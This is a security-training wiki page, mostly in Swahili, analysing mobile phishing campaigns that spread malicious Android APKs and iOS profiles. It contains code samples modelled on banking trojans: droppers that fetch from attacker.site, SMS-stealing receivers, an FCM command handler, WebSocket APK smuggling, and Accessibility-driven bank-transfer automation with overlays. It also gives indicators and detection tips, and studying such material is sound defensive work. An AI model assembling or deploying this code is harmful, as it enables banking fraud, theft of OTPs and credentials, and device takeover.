# Phishing ya Simu & Usambazaji wa Apps Zenye Madhara (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ukurasa huu unafunika mbinu zinazotumika na wahalifu wa tishio kusambaza **malicious Android APKs** na **iOS mobile-configuration profiles** kupitia phishing (SEO, social engineering, maduka bandia, apps za udate, n.k.).
> Nyenzo imeadaptishwa kutoka kampeni ya SarangTrap iliyofichuliwa na Zimperium zLabs (2025) na utafiti mwingine wa umma.

## Mtiririko wa Shambulio

1. **Miundombinu ya SEO/Phishing**
* Sajili domeini kadhaa zinazofanana (dating, cloud share, car service…).
– Tumia maneno muhimu katika lugha ya eneo na emojis katika elementi ya `<title>` ili kupata nafasi kwenye Google.
– Weka maelekezo ya usakinishaji ya Android (`.apk`) na iOS kwenye ukurasa wa kutua mmoja.
2. **Upakuaji wa Hatua ya Kwanza**
* Android: link ya moja kwa moja kwenda APK isiyotiwa saini (*unsigned*) au “third-party store” APK.
* iOS: `itms-services://` au link ya HTTPS kwa profile yenye madhara ya **mobileconfig** (angalia hapa chini).
3. **Uhandisi wa Kijamii Baada ya Kusakinisha**
* Kwa mara ya kwanza app itauliza kwa **invitation / verification code** (hisia ya upatikanaji wa kipekee).
* Msimbo huo unatumwa kwa POST kupitia HTTP kwa Command-and-Control (C2).
* C2 inajibu `{"success":true}` ➜ malware inaendelea.
* Dynamic analysis ya Sandbox / AV ambayo haitoi msimbo sahihi haiona tabia hatarishi (evasion).
4. **Matumizi Mabaya ya Ruhusa Wakati wa Runtime** (Android)
* Ruhusa hatari zinaombwa tu **baada ya jibu chanya kutoka C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Tofauti za hivi karibuni **huondoa `<uses-permission>` kwa SMS kutoka `AndroidManifest.xml`** lakini huacha njia ya Java/Kotlin inayosoma SMS kupitia reflection ⇒ hupunguza alama ya static huku ikibaki kufanya kazi kwenye vifaa vinavyotoa ruhusa kupitia matumizi mabaya ya `AppOps` au malengo ya zamani.
5. **UI ya Facade & Ukusanyaji wa Background**
* App inaonyesha views zisizo hatari (SMS viewer, gallery picker) zilitekelezwa ndani ya app.
* Wakati huo huo inachukua na kutuma nje:
- IMEI / IMSI, nambari ya simu
- Dump kamili ya `ContactsContract` (JSON array)
- JPEG/PNG kutoka `/sdcard/DCIM` zimeshinywa kwa kutumia [Luban](https://github.com/Curzibn/Luban) kupunguza ukubwa
- Yenye hiari: maudhui ya SMS (`content://sms`)
Payloads zinachukuliwa kama **batch-zipped** na kutumwa kwa `HTTP POST /upload.php`.
6. **Mbinu ya Usambazaji ya iOS**
* Profaili moja ya **mobile-configuration profile** inaweza kuomba `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` n.k. ili kusajili kifaa katika usimamizi unaofanana na “MDM”.
* Maelekezo ya social-engineering:
1. Open Settings ➜ *Profile downloaded*.
2. Taweka *Install* mara tatu (picha za skrini kwenye ukurasa wa phishing).
3. Trust the unsigned profile ➜ mshambuliaji anapata *Contacts* & *Photo* entitlement bila ukaguzi wa App Store.
7. **Tabaka la Mtandao**
* HTTP wazi, mara nyingi kwenye port 80 na HOST header kama `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (hakuna TLS → rahisi kugundua).

## Vidokezo za Red-Team

* **Dynamic Analysis Bypass** – Wakati wa tathmini ya malware, otomatisha awamu ya msimbo wa mwaliko kwa kutumia Frida/Objection ili kufikia tawi lenye madhara.
* **Manifest vs. Runtime Diff** – Linganisha `aapt dump permissions` na runtime `PackageManager#getRequestedPermissions()`; kukosekana kwa ruhusa hatarishi ni ishara ya hatari.
* **Network Canary** – Sanidi `iptables -p tcp --dport 80 -j NFQUEUE` kugundua mlipuko wa POST zisizo thabiti baada ya kuingiza msimbo.
* **mobileconfig Inspection** – Tumia `security cms -D -i profile.mobileconfig` kwenye macOS kuorodhesha `PayloadContent` na kugundua idhini kupita kiasi.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Viashiria (Za Kawaida)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Mfumo huu umeonekana katika kampeni zinazotumilia mada za misaada ya serikali ili kuiba kredenshali za UPI za India na OTPs. Waendeshaji wanachanganya majukwaa yenye sifa kwa ajili ya usambazaji na ustahimilivu.

### Delivery chain across trusted platforms
- YouTube video lure → maelezo yana kiungo kifupi
- Kiungo kifupi → tovuti ya phishing kwenye GitHub Pages ikijitia portal halali
- Repo moja ya GitHub inahifadhi APK yenye badge bandia ya “Google Play” inayounganisha moja kwa moja kwa faili
- Kurasa za phishing zinazobadilika zinaishi kwenye Replit; chanzo cha amri kwa mbali kinatumia Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- APK ya kwanza ni installer (dropper) ambayo husafirisha malware halisi katika `assets/app.apk` na kuamsha mtumiaji kuzima Wi‑Fi/data za simu ili kupunguza ugunduzi wa cloud.
- Payload iliyojengwa ndani inasakinishwa chini ya lebo isiyoibua mashaka (mfano, “Secure Update”). Baada ya usakinishaji, msakinishaji na payload wote wawili hupatikana kama apps tofauti.

Ushauri wa triage ya static (grep kwa payloads zilizojengwa ndani):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Ugunduzi wa endpoints unaotegemea mabadiliko kupitia shortlink
- Malware hupakua orodha ya plain-text, iliyotengwa kwa koma ya endpoints zinazoishi kutoka kwenye shortlink; mabadiliko rahisi ya string hutengeneza path ya mwisho ya ukurasa wa phishing.

Mfano (imesafishwa):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudokodi:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Hatua ya “Make payment of ₹1 / UPI‑Lite” inapakia fomu ya HTML ya mshambuliaji kutoka kwa endpoint ya dinamiki ndani ya WebView na inakusanya mashamba nyeti (namba ya simu, benki, UPI PIN) ambayo zina`POST`wa kwa `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Kuenea binafsi na kuingilia kati kwa SMS/OTP
- Ruhusa kali zinaombwa wakati wa kuendesha kwa mara ya kwanza:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Wasiliano zinapitia mzunguko ili kutuma kwa wingi smishing SMS kutoka kwenye kifaa cha mwathiriwa.
- SMS zinazoingia zinakamatiwa na broadcast receiver na kupakiwa pamoja na metadata (mtumaji, maudhui, SIM slot, per-device random ID) kwenye `/addsm.php`.

Mfano wa broadcast receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) as resilient C2
- Payload husajiliwa kwa FCM; ujumbe za push zinabeba uwanja `_type` unaotumika kama swichi kuanzisha vitendo (mf., sasisha templates za maandishi za phishing, badilisha tabia).

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Rasimu ya Handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Viashiria/IOCs
- APK ina secondary payload katika `assets/app.apk`
- WebView inapakia malipo kutoka `gate.htm` na inafanya exfiltration kwa `/addup.php`
- SMS exfiltration kwa `/addsm.php`
- Shortlink-driven config fetch (mfano, `rebrand.ly/*`) ikirudisha endpoints za CSV
- Apps zinazoonekana kama generic “Update/Secure Update”
- FCM `data` messages zenye discriminator `_type` katika apps zisizo za kuaminika

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Wavamizi wanabadilisha viungo thabiti vya APK kwa kutumia channel ya Socket.IO/WebSocket iliyojumuishwa katika lures zinazoonekana kama Google Play. Hii inaficha payload URL, inavuka vichujio vya URL/extension, na inahifadhi install UX ya kweli.

Mtiririko wa kawaida wa client ulioshuhudiwa uwanjani:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Kwa nini huvuka udhibiti rahisi:
- Hakuna URL ya APK ya static inayofichuliwa; payload inajengwa tena ndani ya kumbukumbu kutoka kwa WebSocket frames.
- URL/MIME/extension filters ambazo zinazuia majibu ya moja kwa moja ya .apk zinaweza kupuuza binary data iliyopitishwa kupitia WebSockets/Socket.IO.
- Crawlers na URL sandboxes ambazo hazitekelezi WebSockets hazitapata payload.

Angalia pia WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – Somo la kesi la RatOn

The RatOn banker/RAT campaign (ThreatFabric) ni mfano halisi wa jinsi operesheni za kisasa za mobile phishing zinavyochanganya WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, na hata NFC-relay orchestration. Sehemu hii inatoa muhtasari wa mbinu zinazoweza kutumika tena.

### Stage-1: WebView → native install bridge (dropper)

Wavamizi huonyesha WebView inayorejea kwenye ukurasa wa attacker na kuingiza JavaScript interface inayofichua native installer. Kugusa kifungo cha HTML huita native code ambayo inasakinisha APK ya hatua ya pili iliyounganishwa katika assets za dropper kisha kuizindua moja kwa moja.

Mfano mdogo:

<details>
<summary>Mfano mdogo wa Stage-1 dropper (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML kwenye ukurasa:
```html
<button onclick="bridge.installApk()">Install</button>
```
Baada ya kusakinisha, dropper huanzisha payload kupitia explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Wazo la kutafuta tishio: untrusted apps zinazoita `addJavascriptInterface()` na kufichua installer-like methods kwa WebView; APK ikileta payload ya pili iliyojengewa ndani `assets/` na kuitisha Package Installer Session API.

### Mfereji wa idhini: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 inafungua WebView inayoshikilia ukurasa wa “Access”. Kitufe chake kinaita exported method inayompeleka madhulumiwa kwenye mipangilio ya Accessibility na kuomba kuwezesha huduma ya rogue. Mara inaporuhusiwa, malware inatumia Accessibility kubonyeza kiotomatiki kupitia mazungumzo ya ruhusa za runtime yaliyofuata (contacts, overlay, manage system settings, etc.) na kuomba Device Admin.

- Accessibility kwa programu husaidia kukubali maombi ya baadaye kwa kutafuta vitufe kama “Allow”/“OK” katika node-tree na kutekeleza bonyeza.
- Kukagua/kuomba ruhusa ya Overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operators can issue commands to:
- render a full-screen overlay from a URL, or
- pass inline HTML that is loaded into a WebView overlay.

Likely uses: coercion (PIN entry), wallet opening to capture PINs, ransom messaging. Keep a command to ensure overlay permission is granted if missing.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: periodically dump the Accessibility node tree, serialize visible texts/roles/bounds and send to C2 as a pseudo-screen (commands like `txt_screen` once and `screen_live` continuous).
- High-fidelity: request MediaProjection and start screen-casting/recording on demand (commands like `display` / `record`).

### ATS playbook (bank app automation)
Given a JSON task, open the bank app, drive the UI via Accessibility with a mix of text queries and coordinate taps, and enter the victim’s payment PIN when prompted.

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Malipo mapya"
- "Zadat platbu" → "Ingiza malipo"
- "Nový příjemce" → "Mpokeaji mpya"
- "Domácí číslo účtu" → "Nambari ya akaunti ya ndani"
- "Další" → "Ifuatayo"
- "Odeslat" → "Tuma"
- "Ano, pokračovat" → "Ndio, endelea"
- "Zaplatit" → "Lipa"
- "Hotovo" → "Imekamilika"

Waendeshaji pia wanaweza kuangalia/kuongeza mipaka ya uhamisho kupitia amri kama `check_limit` na `limit` ambazo huzunguka UI ya mipaka kwa njia sawa.

### Crypto wallet seed extraction
Malengo kama MetaMask, Trust Wallet, Blockchain.com, Phantom. Mtiririko: fungua (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Tekeleza locale-aware selectors (EN/RU/CZ/SK) ili kuimarisha urambazaji katika lugha tofauti.

### Device Admin coercion
Device Admin APIs hutumiwa kuongeza fursa za PIN-capture na kumkera mwathiriwa:

- Kufunga mara moja:
```java
dpm.lockNow();
```
- Fanya cheti cha sasa kusitishwa ili kulazimisha mabadiliko (Accessibility inakamata PIN/neno la siri mpya):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Lazimisha kufungua isiyo ya biometriki kwa kuzima vipengele vya biometriki vya keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Kumbuka: Kontoli nyingi za DevicePolicyManager zinahitaji Device Owner/Profile Owner kwenye Android za hivi karibuni; baadhi ya matoleo ya OEM yanaweza kuwa dhaifu. Thibitisha kila mara kwenye OS/OEM lengwa.

### Uratibu wa relay ya NFC (NFSkate)
Stage-3 inaweza kusakinisha na kuanzisha moduli ya relay ya NFC ya nje (mf., NFSkate) na hata kumpa template ya HTML kumwelekeza mhanga wakati wa relay. Hii inawawezesha cash-out ya card-present isiyo ya kugusa pamoja na online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Seti ya amri za Operator (mfano)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: mdundo wa maandishi kama wa binadamu na utoaji mara mbili wa maandishi (Herodotus)

Watendaji wa vitisho wanazidisha kuchanganya automation inayotegemea Accessibility na anti-detection iliyosawazishwa dhidi ya biometrics za tabia za msingi. Banker/RAT ya hivi karibuni inaonyesha njia mbili za utoaji wa maandishi zinazokamilishana na swichi ya operator kuiga uandishi wa kibinadamu kwa mdundo uliopangwa nasibu.

- Discovery mode: orodhesha nodes zinazoonekana kwa selectors na bounds ili kulenga kwa usahihi inputs (ID, text, contentDescription, hint, bounds) kabla ya kuchukua hatua.
- Utoaji wa maandishi mara mbili:
- Mode 1 – `ACTION_SET_TEXT` directly on the target node (thabiti, hakuna keyboard);
- Mode 2 – clipboard set + `ACTION_PASTE` into the focused node (inafanya kazi wakati `setText` ya moja kwa moja imezuiwa).
- Human-like cadence: gawanya string iliyotolewa na operator na ilete herufi kwa herufi kwa ucheleweshaji wa nasibu wa 300–3000 ms kati ya matukio ili kuepuka heuristics za “machine-speed typing”. Itekelezwe kwa kuongeza polepole thamani kupitia `ACTION_SET_TEXT`, au kwa kubandika herufi moja kwa wakati.

<details>
<summary>Java sketch: ugunduzi wa node + utoaji uliocheleweshwa kwa herufi kwa kutumia setText au clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Overlays za kuzuia kwa ajili ya kuficha udanganyifu:
- Tengeneza `TYPE_ACCESSIBILITY_OVERLAY` ya skrini nzima yenye opacity inayodhibitiwa na operator; iwe isiyo wazi (opaque) kwa mwathiri huku automation ya mbali ikiendelea chini yake.
- Amri zinazotolewa kawaida: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Overlay ndogo yenye alpha inayoweza kubadilishwa:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Vipengele vya msingi vya udhibiti vya operatori vinavyoonekana mara kwa mara: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## Marejeo

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
